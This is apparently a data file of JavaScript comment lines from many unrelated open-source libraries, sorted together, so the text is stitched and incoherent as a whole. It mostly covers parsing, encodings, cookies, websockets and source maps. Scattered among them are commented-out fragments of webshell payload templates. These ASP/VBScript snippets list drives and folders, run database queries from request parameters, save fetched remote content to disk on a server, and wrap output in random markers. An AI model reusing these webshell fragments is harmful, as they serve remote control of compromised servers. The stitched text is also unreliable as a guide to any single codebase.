				// But now, this ""simulate"" function is used only for events"
				// For the compat branch though, guard for ""click"" and ""submit"""
		//   1. An object of properties"
		//   1. No key was specified"
		//   1. The entire cache object"
		// Support: Firefox<=42+"
		// Take the ""read"" path and allow the get method to determine"
		_depth_: 1,"
		if ( key === undefined ||"
		return validate(instance, schema, {changing: false});//, coerce: false, existingOnly: false});"
		return validate(value, schema, {changing: property || ""property""});"
		this.set( owner, key, value );"
	                                // TODO: Try to re-run the transaction."
	            // See: github.com/mozilla/localForage/pull/435#discussion_r38061530"
	            // We test for openDatabase because IE Mobile identifies itself"
	        // TODO: See why those tests fail and use a better solution."
	    //   * Every element in `ary[i+1 .. j-1]` is greater than the pivot."
	    //   * Every element in `ary[p .. i]` is less than or equal to the pivot."
	    //   1. AssignmentExpression"
	    // Detect blob support. Chrome didn't support it until version 38."
	    // Furthermore, they have some outstanding bugs where blobs occasionally"
	    // In order to avoid exponential backtracking, we use two flags to denote if the production can be"
	    // Oftentimes this will just deserialize JSON content, but if we have a"
	    // Sadly we use the 404 bug to detect the FileReader bug, so if they"
	    // The partitioning chooses a pivot between `p` and `r` and moves all"
	    // The three productions have the relationship:"
	    // There are three productions that can be parsed in a parentheses pair that needs to be determined"
	    // When an assignment expression position starts with an left parenthesis, the determination of the type"
	    // inheritCoverGrammar function runs the given parse function with a new cover grammar context, and it propagates"
	    // isolateCoverGrammar function runs the given parser function with a new cover grammar context, and it does not"
	    // with a single exception that CoverInitializedName when used directly in an Expression, generates"
	    function _checkBlobSupportWithoutCaching(idb) {"
	  //   1. We find the exact element we are looking for."
	  //   2. We did not find the exact element, but we can return the index of"
	  //   3. We did not find the exact element, and there is no next-closest"
	  // The spec says:"
	//     {"
	//   Continuation"
	// All properties except for `generatedLine` and `generatedColumn` can be"
	// Each object in the arrays is of the form:"
	// This logic, however, is not guaranteed and can change at any point in the future"
	// `_generatedMappings` is ordered by the generated positions."
	// `_originalMappings` is ordered by the original positions."
	// but those exceptions were never presented as a real life use-cases"
                            // TODO: Try to re-run the transaction."
                        // var t = 20;  /**"
            //   `options.indent`"
            // Instead of them, we can use `option.format.indent`."
            // See: https://hackerone.com/reports/541502"
          //   It is a Syntax Error if |DestructuringAssignmentTarget| is an |ArrayLiteral| or an |ObjectLiteral|."
        //     var x = <div>one</div><div>two</div>;"
        //   It is a Syntax Error if |DestructuringAssignmentTarget| is an |ArrayLiteral| or an |ObjectLiteral|."
        //   var rest = Array.prototype.slice.call(arguments, n);"
        // Remove only the listeners added via `addEventListener`."
        // See: github.com/mozilla/localForage/pull/435#discussion_r38061530"
        // TODO: See why those tests fail and use a better solution."
        // The visual score and logical score are accumulated throughout the text and"
        // This `if` statement is only needed for Node.js < 10.0.0 because as of"
        // This ensures that the synchronous parts of localforage initialization"
        // To ensure that they work when the drivers are loaded asynchronously,"
        // We automatically filter out all 7-bit characters (replace them with spaces)"
        // We test for openDatabase because IE Mobile identifies itself"
        // antonio.afonso: need to change this otherwise languages like pt, es, fr using latin1 will never be detected."
        // the default error message is a bit incomprehensible. Since it's"
        // where `rest` is the name of the rest parameter, and `n` is a"
        if (listeners[i]._listener) this.removeListener(method, listeners[i]);"
        return;"
      // An `'error'` event is emitted, only on Node.js < 10.0.0, if the"
      // Close the http server if it was internally created."
      // Firefox doesn't support selectionchange, so check selection status"
      // In particular, it's useful for erroring if the server fails to send"
      // Note that we have to use [[DefineProperty]] instead of [[Put]]"
      // Optionally call external protocol selection handler."
      // The value of a quoted-string after unescaping must conform to the"
      // This also ensures a stable sort in V8 and other engines."
      // This error is handled by the `'error'` listener on the socket. We only"
      // This message is not compressed so its lenght is the sum of the payload"
      // b: 2,"
      b: '[Redacted]',"
      if (err) return;"
      if (isEscaping) {"
      if (this.options.handleProtocols) {"
      if (this.options.port != null) {"
      this._deflate.on('error', NOOP);"
      this._messageLength = this._totalPayloadLength;"
    //   * Every element in `ary[i+1 .. j-1]` is greater than the pivot."
    //   * Every element in `ary[p .. i]` is less than or equal to the pivot."
    //   1. We find the exact element we are looking for."
    //   2. We did not find the exact element, but we can return the next"
    //   3. We did not find the exact element, and there is no next-closest"
    //   class Foo extends mixin(Bar, Baz) {}"
    //   let data = folders.concat(files);"
    //   let folders = [];"
    //   tmp.map( (t) => {"
    //   tmp.sort();"
    //   var rest = Array.prototype.slice.call(arguments, n);"
    // ""Append to buffer the six bits corresponding to number, most"
    // 'mySelectorCallback' will be invoked"
    // 'mySpecialSelector': {"
    // 99% of the time, keydown and keyup aren't necessary. IE8 fails to fire"
    // After JIS X 0213 appeared, Shift_JIS-2004, EUC-JISX0213 and ISO2022-JP-2004 followed, with just changing the planes."
    // Allow external modification/inspection of handshake headers."
    // Allow to change `binaryType` on the fly."
    // Destroy the socket if the client has already sent a FIN packet."
    // Note: name will only be `public` or `private`"
    // Optionally call external client verification handler."
    // Overall, it seems that it's a mess :( http://www8.plala.or.jp/tkubota1/unicode-symbols-map2.html"
    // Specify a timeout for the closing handshake to complete."
    // TODO: Looks like there is bug in Node fs.createReadStream"
    // TODO: See why those tests fail and use a better solution."
    // Terminate all associated clients."
    // The WHATWG URL constructor is not available on Node.js < 6.13.0"
    // The maximum safe integer in JavaScript is 2^53 - 1. An error is returned"
    // The partitioning chooses a pivot between `p` and `r` and moves all"
    // The user may have closed the connection from a listener of the `upgrade`"
    // This can only happen via state.decoder -- no other venue"
    // Walk through the string checking with a /g regexp"
    // [range]: https://bugzilla.mozilla.org/show_bug.cgi?id=745678"
    // `binop`, when present, specifies that this operator is a binary"
    // `isAssign` marks all of `=`, `+=`, `-=` etcetera, which act as"
    // `prefix` and `postfix` mark the operator as a prefix or postfix"
    // `socket.bufferSize` is `undefined` if the socket is closed."
    // also: don't forget our current request if we're expecting another"
    // atobLookup() implements the table from the spec."
    // remove this leading '<code>-' (or '<code> ' from last line) from each"
    // stopWatching() should be a noop here but we call it just in case we"
    // where `rest` is the name of the rest parameter, and `n` is a"
    if (!socket.readable || !socket.writable) return socket.destroy();"
    if (num > Math.pow(2, 53 - 32) - 1) {"
    if (this._receiver) this._receiver._binaryType = type;"
    if (this.clients) {"
    if (this.options.verifyClient) {"
    if (websocket.readyState !== WebSocket.CONNECTING) return;"
    parsedUrl = url.URL ? new url.URL(address) : url.parse(address);"
    return (this._socket.bufferSize || 0) + this._sender._bufferedBytes;"
    this._closeTimer = setTimeout("
    this.conns = {"
    this.emit('headers', headers, req);"
    var addresses = interfaces[nic].filter((details) => {"
  //     walk.simple(myTree, {"
  //     {"
  //   1. We find the exact element we are looking for."
  //   2. We did not find the exact element, but we can return the index of"
  //   3. We did not find the exact element, and there is no next-closest"
  //   > It is a Syntax Error if AssignmentTargetType of [the production] is not"
  //   > It is a Syntax Error if [the production] is neither an ObjectLiteral nor"
  //   As a special case, function parameters also use checkLValInnerPattern(),"
  //   Continuation"
  //   Examples where this is used include:"
  //   It is also appropriate for checking if an identifier is valid and not"
  //   ONE.foo = function (bar) {"
  //   ONE.foo=function(a){return baz(a);};"
  //   TWO.inc = function (n) {"
  // ""If input contains a character that is not in the following list of"
  // - Check that none of the bound/assigned-to identifiers are reserved words."
  // - checkLValInnerPattern() shall be used if the syntactic construct supports"
  // - checkLValPattern() shall be used if the syntactic construct supports"
  // - checkLValSimple() shall be used if the syntactic construct supports"
  // 2. If that resulting state will trigger a _read, then call _read."
  // 3. Actually pull the requested chunks out of the buffer and return."
  // 4 The ArrayBufferView Type"
  // 5 The Typed Array View Types"
  // All in the name of speed."
  // All properties except for `generatedLine` and `generatedColumn` can be"
  // And here is the generated code (min.js):"
  // Batching is necessary here in order to ensure that all event handlers run"
  // Default to `ipv4`"
  // Each object in the arrays is of the form:"
  // Here is one.js:"
  // Here is two.js:"
  // If a complex binding pattern is encountered (e.g., object and array"
  // If a specific network interface has been named,"
  // If all else fails, use Math.random().  It's fast, but is of unspecified"
  // If expecting a statement and finding a slash operator, parse a"
  // If the function is called with a non-BIND_NONE bindingType, then"
  // In addition to the above conditions to keep reading data, the following"
  // In an async function, you may do"
  // Incrementally adds only escaped chars, adding other chunks as-is"
  // NB: This is a pretty rare edge case."
  // Note: this does not catch all invalid nesting, nor does it try to (as it's"
  // Override `options.path` only if `options` is a copy of the original options"
  // So, the steps are:"
  // The `startsExpr` property is used to check if the token ends a"
  // The base argument can be used to pass a custom (recursive)"
  // The close frame might not have been received or the `'end'` event emitted,"
  // The conditions for reading more data are (one of):"
  // The spec says:"
  // There are three versions of checkLVal*() appropriate for different"
  // There is no need to call `Zlib#close()` as the handle is automatically"
  // These functions deliberately support both assignment and binding constructs,"
  // This also ensures a stable sort in V8 and other engines."
  // This specific case is a silent failure in cp, install, tar,"
  // U+002B PLUS SIGN (+)"
  // We append bits via left-shift and or.  accumulatedBits is used to track"
  // When running as root, or if other types of errors are"
  // [api]: https://developer.mozilla.org/en-US/docs/SpiderMonkey/Parser_API"
  // [range]: https://bugzilla.mozilla.org/show_bug.cgi?id=745678"
  // `_generatedMappings` is ordered by the generated positions."
  // `_originalMappings` is ordered by the original positions."
  // `binop`, when present, specifies that this operator is a binary"
  // `isAssign` marks all of `=`, `+=`, `-=` etcetera, which act as"
  // `isLoop` marks a keyword as starting a loop, which is important"
  // `prefix` and `postfix` mark the operator as a prefix or postfix"
  // if there's no getuid, or if getuid() is something other"
  // to do something with all expressions. All Parser API node types"
  family = _normalizeFamily(family);"
  if (name && name !== 'private' && name !== 'public') {"
  if (options.protocolVersion) options.path = options.socketPath;"
  pp.readToken_dot = function() {"
  this[kPerMessageDeflate]._inflate = null;"
  websocket._socket.read();"
"//	""Brother/33"""
"//	3. Use the same single mechanism to support ""private"" and ""user"" data."
"//	4. _Never_ expose ""private"" data to user code (TODO: Drop _data, _removeData)"
"//	body : ""Sign me up!"""
"//	host: ""example.com"","
"//	nid : ""example"","
"//	nid : ""uuid"","
"//	nss : ""foo"","
"//	resourceName: ""/foo?bar=baz"","
"//	scheme : ""mailto"","
"//	scheme : ""urn"","
"//	scheme : ""wss"","
"//	secure: true,"
"//	subject : ""SUBSCRIBE"","
"//	to : [""alpha@example.com"", ""bravo@example.com""],"
"//	uuid : ""f81d4fae-7dec-11d0-a765-00a0c91e6bf6"","
"//
"// 				throw new Error( ""jQuery requires a window with a document"" );"
"// 			errors: An array of validation errors. If there are no errors, then an"
"// 		""brother"", "
"// 		If a schema is provided, it will be used to validate. If the instance object refers to a schema (self-validating),"
"// 		The checkPropertyChange method will return the same object type as validate, see JSONSchema.validate for"
"// 		factory( global, true ) :"
"// 		not check for self-validation, it is assumed that the passed in value is already internally valid."
"// 		that schema will be used to validate and the schema parameter is not necessary (if both exist,"
"// 		{""brother_id"":33}, "
"// 		{links:[{rel:""brother"", href:""Brother/{brother_id}""}]}) ->"
"// 	// (such as Node.js), expose a factory as module.exports."
"// 	// e.g. var jQuery = require(""jquery"")(window);"
"// 	// is present, execute the factory and get jQuery."
"//                           6( h16 "":"" ) ls32"
"//                       corresponds to this chunk of generated code,"
"//                      ""::"" 5( h16 "":"" ) ls32"
"//                      , data: { satellites: 2, red: true }"
"//                      , data: { satellites: 3 }"
"//                     corresponds to this chunk of generated code,"
"//                0201-1976 Roman, 0208-1978, 0208-1983."
"//               0x8E, 0xA1-0xDF - upper part of 0201"
"//               0x8F, (0xA1-0xFE)x2 - 0212 plane (94x94)."
"//               Windows CP932 is a superset of Shift_JIS. Some companies added more chars, notably KDDI."
"//               chunk of code,"
"//               encoding of 0208. Lead byte ranges: 0x81-0x9F, 0xE0-0xEF; Trail byte ranges: 0x40-0x7E, 0x80-0x9E, 0x9F-0xFC."
"//              2 planes, first is superset of 0208, second - revised 0212."
"//              Has several variations in 1978, 1983, 1990 and 1997."
"//              Introduced in 2000, revised 2004. Some characters are in Unicode Plane 2 (0x2xxxx)"
"//              ret && ret.length,"
"//              rs.needReadable,"
"//             optional unsigned long byteOffset, optional unsigned long length)"
"//             optional unsigned long byteOffset,"
"//          $(""[href='#""+cid+""']"").addClass('active');"
"//          $(""[href='#""+pid+""']"").removeClass('active');"
"//          typeof /./ === ""function""; // => false in IE and Opera,"
"//         <= SEQ_START  -> index of the start of a character code sequence, in decodeTableSeq."
"//         <= SEQ_START  -> it's an index in encodeTableSeq, see below. The character starts a sequence."
"//        , key: 'name'"
"//        , message: 'Unique constraint violated for key name' }"
"//        <li class=""plum"">Plum</li>"
"//        curve.fromBigInteger(new BigInteger(x.toString(""hex""), 16)),"
"//        curve.fromBigInteger(new BigInteger(y.toString(""hex""), 16)));      "
"//       <li class=""apple"">Apple</li>"
"//       <li class=""orange"">Orange</li>"
"//       generatedColumn: The column number in the generated code,"
"//       generatedLine: The line number in the generated code,"
"//       icon: 'fa fa-edit',"
"//       icon: 'fa fa-plus-circle',"
"//       icon: 'fa fa-remove',"
"//       name: _[0],"
"//       size: _[2],"
"//       text: LANG['list']['menu']['add'],"
"//       text: LANG['list']['menu']['del'],"
"//       text: LANG['list']['menu']['edit'],"
"//       time: _[1],"
"//      <li class=""apple"">Apple</li>"
"//      <li class=""orange"">Orange</li>"
"//      <li class=""pear"">Pear</li>"
"//      <li class=""plum"">Plum</li>"
"//      element than the one we are searching for, so we return -1."
"//      element which is less than the one we are searching for, so we"
"//      this.P = new ECPointFp(curve,"
"//      var x = key.slice(1,bytes+1); // skip the 04 for uncompressed format"
"//     (c) 2009-2013 Jeremy Ashkenas, DocumentCloud Inc."
"//     (c) 2009-2015 Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors"
"//     - If no C has a prerelease and the GT.semver tuple, return false"
"//     - If no C has a prerelease and the LT.semver tuple, return false"
"//     // 'http://localhost:4000/1000',"
"//     <div class=""healthy"">"
"//     <div class=""red-fruit"">"
"//     <li class=""apple"">Apple</li>"
"//     <li class=""orange"">Orange</li>"
"//     <li class=""plum"">Plum</li>"
"//     `...` DestructuringAssignmentTarget[Yield, Await]"
"//     base: 'SauceLabs',"
"//     browserName: 'internet explorer',"
"//     column: 1 },"
"//     column: 1,"
"//     column: 10 },"
"//     column: 10,"
"//     column: 20,"
"//     f1: [stats for file1],"
"//     f2: [stats for file2],"
"//     filtering by @media (screen? print?), layout for widths/heights"
"//     gradient: false,"
"//     label: `random\t(${LANG['list']['not_recommended']})`,"
"//     lastColumn: 19 },"
"//     lastColumn: 9 },"
"//     legend:{""template"":""#os#"",""marker"":{""type"":""square"",""width"":25,""height"":15}},"
"//     name: `encoder_${c}`,"
"//     ordering.  If two or more parameters share the same name, they"
"//     return toastr.error(ret.substr(9), LANG_T['error']);"
"//     single string by using an ""&"" character (ASCII code 38) as"
"//     this.getPath('test.json'),"
"//     toastr.error(LANG['delete']['error'](path, ret === '0' ? false : ret), LANG_T['error']);"
"//     toastr.success(LANG['delete']['success'](path), LANG_T['success']);"
"//     type: 'newcolumn',"
"//     type: 'radio',"
"//     value using an ""="" character (ASCII code 61) as a separator, even"
"//     value: 'random',"
"//     version: '8',"
"//     view: 'pie' ,"
"//     }, {"
"//     },"
"//    ""."" + X.slice(""name"".length), `package.json` ""exports"", [""node"", ""require""])"
"//    $(""#menu a"").anchorjump({ offset: -30 });"
"//    $(""#menu"").anchorjump({ for: 'a', offset: -30 });"
"//    ...,"
"//    17, 233, 146,  52, 155,  29,"
"//    27, 157, 107, 205, 187, 253,  75,  45,"
"//    43, 13, 123,  61, 203,"
"//    44,  94, 164, 192,  64, 103,"
"//    44, 94, 164, 192,  64, 103, 17, 233,"
"//    44, 94, 164, 193,  64, 103, 17, 233,"
"//    Hebrew, words ending with Kaf, Mem, Nun, Pe or Tsadi, should not end with"
"//    In the encoder, it might make sense to support encoding old PUA mappings to Big5 bytes seq-s."
"//    Plus, it has 4 combining sequences."
"//    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"//    `package.json` ""exports"", [""node"", ""require""]) defined in the ESM resolver."
"//    and including percent encoded variants, throw an Invalid Package Target error."
"//    console.log(_);     let farr = _.split(""#"");"
"//    distributed under the License is distributed on an ""AS IS"" BASIS,"
"//    encoded variants, throw an Invalid Module Specifier error."
"//    equal to the length of expansionKey, then"
"//    indication that the text is laid out ""naturally"" since the final letter"
"//    new URL(sourceURL, sourceMapURL).toString()"
"//    pack<Type>()   - take a number (interpreted as Type), output a byte array"
"//    that x-mac-hebrew texts are so rare, writing another model prober isn't"
"//    the line order is unimportant (In fact, for this implementation, even"
"//    unpack<Type>() - take a byte array, output a Type-like number"
"//   'defaults', 'rest', 'async' ]"
"//   * Removed unsupported features (destructuring, let, comprehensions...)."
"//   - Else if in prerelease mode, return false"
"//   - If C is only the ANY comparator, return true"
"//   - If EQ satisfies every C, return true"
"//   - If GT is >=, and GT.semver does not satisfy every C, return false"
"//   - If GT, and EQ does not satisfy GT, return true (null set)"
"//   - If GT.semver has a prerelease, and not in prerelease mode"
"//   - If GT.semver is lower than any > or >= comp in C, return false"
"//   - If LT is <=, and LT.semver does not satisfy every C, return false"
"//   - If LT, and EQ does not satisfy LT, return true (null set)"
"//   - If LT.semver is greater than any < or <= comp in C, return false"
"//   - getComputedStyle(): requires default stylesheet, cascading, inheritance,"
"//   - if in prerelease mode, return true"
"//   - support qop=""auth-int"" only"
"//   125, 75, 173, 155, 221,"
"//   146, 52, 155,  29, 235,  77, 59, 125"
"//   146, 52, 155,  29, 235,  77, 59, 125,"
"//   155,  29, 235,  77,  59, 125,  75, 173,"
"//   155,  93, 171, 141, 251, 189,  75, 237"
"//   155, 221,  43,  13, 123,  61, 203, 109,"
"//   155, 29, 235,  77,  59,"
"//   2. A string key was specified, but no value provided"
"//   235,  77,  59, 125"
"//   AssignmentRestProperty[Yield, Await] :"
"//   It does, however, support innerHTML"
"//   Line 4: An optional source root, useful for relocating source"
"//   [""node"", ""require""]) defined in the ESM resolver."
"//   \`id\` INT UNSIGNED AUTO_INCREMENT,"
"//   \`title\` VARCHAR(100) NOT NULL,"
"//   ], event);"
"//   _id: this.manager.opt['_id'],"
"//   anything checkLValPattern() supports, as well as default assignment"
"//   anything checkLValSimple() supports, as well as object and array"
"//   broadcastAddress: '192.168.1.191',"
"//   circle: '[Circular]',"
"//   column: 10,"
"//   column: 2,"
"//   column: null,"
"//   defined elsewhere, like import declarations or function/class identifiers."
"//   first  byte range: 0x81 -- 0x9f , 0xe0 -- 0xef"
"//   firstAddress: '192.168.1.129',"
"//   function Foo() {} var ____Class0Blah = mixin(Bar, Baz);"
"//   generatedColumn: 0,"
"//   generatedLine: 1,"
"//   generatedLine: 2,"
"//   grid.selectCell(idx, index);"
"//   icon: 2,"
"//   lastAddress: '192.168.1.190',"
"//   length: 64,"
"//   line: 2,"
"//   line: null,"
"//   loaded, or only the primary sheet?"
"//   method, but they are processing the call asynchronously and have _not_"
"//   numHosts: 62,"
"//   originalColumn: 0,"
"//   originalLine: 1,"
"//   originalLine: 2,"
"//   patterns, rest elements, and other constructs that may appear within an"
"//   request-host domain-matches the cookie's domain."""
"//   return this[_encoders[_index]](pwd, data);"
"//   second byte range: 0x40 -- 0x7e , 0xa1 -- 0xfe"
"//   second byte range: 0x40 -- 0x7e,  0x80 -- 0xfc"
"//   shift: 6,"
"//   some `R1, R2, ...`"
"//   state.decoder: streams2, specifically < 0.10.6"
"//   subnetMask: '255.255.255.192',"
"//   subnetMaskLength: 26,"
"//   tag_e = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5)); // ""|<-"";"
"//   tag_s = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5)); // ""->|"";"
"//   this.cache.set(cache_tag, JSON.stringify(data));"
"//   this.tree.callEvent('onClick', [id]);"
"//   toastr.error(""Not Support"", LANG_T[""error""]);"
"//   toastr.error((err instanceof Object) ? JSON.stringify(err) : String(err), LANG_T['error']);"
"//   toastr.error((typeof(err) === 'object') ? JSON.stringify(err) : String(err), LANG_T['error']);"
"//   toastr.error(LANG['delete']['error'](path, err), LANG_T['error']);"
"//   var __t, __p = '';"
"//   { line: 2,"
"//  ""a"": 1"
"//  'Expression': /\u0080-\uffff/,"
"//  (foo, bar);"
"//  * ""-&"" while in base64 is not allowed."
"//  * Base64 part is started by ""&"" instead of ""+"""
"//  * Big5-HKSCS (-2001, -2004, -2008). Hong Kong standard. "
"//  * Direct characters are 0x20-0x7E, except ""&"" (0x26)"
"//  * ISO2022-JP-2: Adds esc seq for GB2313-1980, KSX1001-1992, ISO8859-1, ISO8859-7."
"//  * ISO2022-JP-3: Adds esc seq for 0201-1976 Kana set, 0213-2000 Planes 1, 2."
"//  * ISO2022-JP: Stateful encoding, with escape sequences to switch between ASCII, "
"//  * In Base64, "","" is used instead of ""/"""
"//  * JIS X 208: 7-bit, direct encoding of 0208. Byte ranges: 0x21-0x7E (94 values). Uncommon."
"//  * Shift_JIS: Compatible with 0201, uses not defined chars in top half as lead bytes for double-byte"
"//  :matches(button, input, select, textarea, menuitem, optgroup, option)[disabled],"
"//  DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC, and either DOCUMENT_POSITION_PRECEDING or"
"//  Pluggable, initialized in high-level API below."
"//  This sets the individual value, and checks to see if all four"
"//  fragment : ""body"""
"//  host : ""2001:db8::7%en1"""
"//  host : ""example.com"","
"//  optgroup[disabled] > option),"
"//  path : ""/one/two.three"","
"//  port : 123,"
"//  query : ""q1=a1&q2=a2"","
"//  scheme : ""uri"","
"//  sub-parts are set.  If so, it sets the shorthand version and removes"
"//  this.PublicKey = Buffer.from(""04""+pubhex,""hex"");"
"//  userinfo : ""user:pass"","
"//  var pubhex = unstupid(this.P.getX().toBigInteger().toString(16),bytes*2)+unstupid(this.P.getY().toBigInteger().toString(16),bytes*2);"
"// !!bookmark[Buffer.from(editor.session.getValue()).toString('base64')],"
"// "" '"
"// "" + e.toString());"
"// "" o  The cookie-path is a prefix of the request-path, and the first"
"// """
"// ""&-"" -> ""&"""
"// ""&Err.Description):Else:Response.Write(""1""):End If`,"
"// ""&Err.Description):Err.Clear:Else:For Each F in FO.subfolders:Response.Write F.Name&chr(47)&chr(9)&FD(F.DateLastModified)&chr(9)&chr(48)&chr(9)&C.GetFolder(F.Path).attributes&chr(10):Next:For Each L in FO.files:Response.Write L.Name&chr(9)&FD(L.DateLastModified)&chr(9)&L.size&chr(9)&C.GetFile(L.Path).attributes&chr(10):Next:End If`,"
"// ""&Err.Description):Err.Clear:End If`,"
"// ""&Err.Description:"
"// ""&Err.Description:Else:S=""1"":End If:Response.Write(S)`,"
"// ""&Err.Description:Else:SI=""1"":End If:Response.Write(SI)`,"
"// ""&Err.Description:End If`,"
"// ""&Err.Description:Err.Clear:Else:S=Server.Mappath(""."")&chr(9):For Each D in C.Drives:S=S&D.DriveLetter&chr(58):Next:End If:Response.Write(S)`"
"// ""&Err.Description:Err.Clear:Else:SI=""[ADO DATABASE]""&chr(9):Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)`,"
"// ""&Err.Description:Err.Clear:Else:Set Rs=Conn.OpenSchema(20):Rs.MoveFirst:SI="""":Do While Not Rs.Eof:If Rs(""TABLE_TYPE"")=""TABLE"" Then:SI=SI&Rs(""TABLE_NAME"")&chr(9):End If:Rs.MoveNext:Loop:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)`,"
"// ""&Err.Description:Err.Clear:Else:Set Rs=CreateObject(""Adodb.Recordset""):Rs.open """"&bd(Request(""${arg2}""))&"""",Conn,1,1:If Err Then:SI=""ERROR:// ""&Err.Description:Err.Clear:Else:For n=0 To Rs.Fields.Count-1:SI=SI&Rs.Fields.Item(n).Name&"" (""&TN(Rs.Fields.Item(n).Type)&"")""&chr(9):Next:Rs.Close:End If:Set Rs=Nothing:Conn.Close:End If:Set Conn=Nothing:Response.Write(SI)`,"
"// ""&Err.Description:Err.Clear:Else:set s=CreateObject(""ADODB.Stream""):s.Mode=3:s.Type=1:s.Open():s.Write x.ResponseBody:s.SaveToFile """"&bd(Request(""${arg2}""))&"""",2:If Err Then:SI=""ERROR:// ""&Err.Description:Err.Clear:Else:SI=""1"":End If:Set x=Nothing:Set s=Nothing:End If:Response.Write(SI)`,"
"// ""&Err.Description:else:SI=""1"":End If:Response.Write(SI)`,"
"// ""&PT&Err.Description:Err.Clear:Else:SI=""1"":End If:Response.Write(SI)`,"
"// ""&amp;#38;"""
"// ""&amp;&num;38&semi;"""
"// ""+-"" -> ""+"""
"// ""+e.toString());"
"// ""+err.message);}Response.Write(""${tag_e.substr(0,tag_e.length/2)}""+""${tag_e.substr(tag_e.length/2)}"");Response.End();`;"
"// ""-3 minutes"""
"// ""-3m"""
"// ""->|"";"
"// ""..."""
"// "".example.com"""
"// ""1 minute"""
"// ""10 hours"""
"// ""10h"""
"// ""1m"""
"// ""2 minutes"""
"// ""2. If the uri-path is empty or if the first character of the uri-path is not"
"// ""2m"""
"// ""3. If the uri-path contains no more than one %x2F (""/"") character, output"
"// ""4. Output the characters of the uri-path from the first character up to,"
"// "":80"" portion is not on the produced URL"
"// ""Advance position by one character."""
"// ""Attribute values must be CSS identifiers [capture 5] or strings [capture 3 or capture 4]"""
"// ""Convert the cookie-domain to lower case."""
"// ""DIRECT"" connection, wait for connection confirmation"
"// ""DIRECT"""
"// ""Either:"
"// ""Extended"" (RFC 3659) commands"
"// ""Find the character pointed to by position in the first column of"
"// ""ISO-8859-8"" - Visual Hebrew"
"// ""ISO-8859-8-I"" - Logical Hebrew"
"// ""If buffer has accumulated 24 bits, interpret them as three 8-bit"
"// ""If buffer is not empty, it contains either 12 or 18 bits. If it"
"// ""If delta-seconds is less than or equal to zero (0), let expiry-time"
"// ""If the attribute-value failed to parse as a cookie date, ignore the"
"// ""If the attribute-value is empty, the behavior is undefined.  However,"
"// ""If the cookie's http-only-flag is true, then exclude the cookie if the"
"// ""If the cookie's secure-only-flag is true, then the request-uri's"
"// ""If the first character of the attribute-value is not a DIGIT or a ""-"""
"// ""If the length of input divides by 4 leaving a remainder of 1, throw an"
"// ""If the length of input divides by 4 leaving no remainder, then: if"
"// ""If the unparsed-attributes string is empty, skip the rest of these"
"// ""Let buffer be a buffer that can have bits appended to it, initially"
"// ""Let output be a string, initially empty."""
"// ""Max-Age="" non-zero-digit *DIGIT"
"// ""Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"""
"// ""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"""
"// ""Proprietary"" Interface."
"// ""Remove all space characters from input."""
"// ""Return output."""
"// ""Software""), to deal in the Software without restriction, including"
"// ""Standard"" (RFC 959) commands"
"// ""The SOCKS service is conventionally located on TCP port 1080"""
"// ""The btoa() method must throw an INVALID_CHARACTER_ERR exception if the"
"// ""The request-uri's path path-matches the cookie's path."""
"// ""Visual"" directionality means that the text is ordered as if the renderer is"
"// ""Whether an element is represented by a :lang() selector"
"// ""While position does not point past the end of input, run these"
"// ""[last word of first line spelled backwards] [whole line ordered backwards"
"// ""\"""
"// ""\\\\hostname\\path\\to\\the file.txt"""
"// ""anyone can guess my name"""
"// ""asyncStorage"""
"// ""c:\\WINDOWS\\clock.avi"""
"// ""c:\\path\\to\\the file.txt"""
"// ""constants"""
"// ""day-of-month = 1*2DIGIT ( non-digit *OCTET )"""
"// ""discard the first "";"" and trim""."
"// ""expand 32-byte k"""
"// ""expected"" way, so undefined is always cast to null in all"
"// ""file:///c|/tmp/test.txt"".  In some cases, the colon is left"
"// ""foo.js"".  Normalize these first so that future comparisons will succeed."
"// ""key1=value1; key2=value2; ..."""
"// ""mapping.generatedColumn"" with ""lastMapping"""
"// ""name"": intentionally not styling"
"// ""negative"" y so we can replace sub with am later"
"// ""non-digit = %x00-2F / %x3A-FF"""
"// ""o  The cookie-path and the request-path are identical."""
"// ""o  The cookie-path is a prefix of the request-path, and the last"
"// ""raw value"" and ""value"" are not used here because jsdom has no GUI"
"// ""statements,"" it's safer simply to skip them."
"// ""this"" should be the larger one if appropriate."
"// ""time-field"" must be strictly ""1*2DIGIT"", HOWEVER, ""hms-time"" can be"
"// ""toplevel"" state. This is exactly"
"// ""true"" if we need to reverse every pair in the model lookup"
"// ""u"""
"// ""value"""
"// ""view more"" object name"
"// ""view more"" text"
"// ""view more"" url"
"// ""windows-1255"" - Logical Hebrew"
"// ""windows-1255"" and ""x-mac-hebrew"" are two different proper supersets of"
"// ""x-mac-hebrew"" - ?? Logical Hebrew ??"
"// ""x-mac-hebrew"" is also identified as windows-1255. A text in x-mac-hebrew"
"// ""year = 2*4DIGIT ( non-digit *OCTET )"""
"// ""|<-"";"
"// #7653, #8125, #8152: local protocol detection"
"// #id, .class, tag"
"// $&, $0 (not followed by 1-9), $00"
"// $('._dropdown-context').fadeOut(options.fadeSpeed, function(){"
"// $('head').append('<link href=""/js/libs/bmenu/bmenu.css"" rel=""stylesheet"">');"
"// $('li', '<ul>...</ul>')"
"// $('li', 'ul')"
"// $('li', node), $('li', [nodes])"
"// $(), $(null), $(undefined), $(false)"
"// $SQLITEFILE not found.""; exit; fi;"
"// $SQLITEFILE not found.""; fi;"
"// $lt, $lte, $gt and $gte work on numbers and strings"
"// %x2F (""/"") and skip the remaining step."""
"// '""', ""'"""
"// '.', 0-9, A-Z, '^', '_', '`', a-z, '|', '~'"
"// '/' on unix, 'c:/' on windows."
"// '/a/b/c/d' -> ['/', '/a', '/a/b', '/a/b/c', '/a/b/c/d']"
"// '0b', '0B' - binary number"
"// '0o', '0O' - octal number"
"// '0x', '0X' - hex number"
"// '<' 60, '>' 62, '{' 123, '}' 125"
"// 'Hello, World!'"
"// 'Hello, world!'"
"// 'JSON.stringify': JSON.stringify,"
"// 'User.get' has signature (id, callback(err, data))"
"// '[', '/', astral"
"// '\u' (U+005C, U+0075) denotes an escaped character."
